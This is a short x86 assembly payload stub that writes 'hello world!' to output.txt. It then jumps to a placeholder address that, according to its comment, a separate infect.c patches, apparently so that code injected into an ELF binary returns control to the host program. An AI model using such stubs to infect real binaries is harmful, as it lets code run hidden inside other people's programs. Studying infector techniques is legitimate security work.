  
section .text       
   global _start
  
_start:                

  mov eax, 8 
  mov ebx, filename
  mov ecx, 0644Q
  int 0x80
  mov ebx, eax
  mov eax, 4
  mov ecx, text 
  mov edx, 13
  int 0x80
  mov eax, 6
  int 0x80

  mov rax, 0x0  ;will be modified in infect.c
  jmp rax

  filename db './output.txt', 0
  text db 'hello world!', 0xa
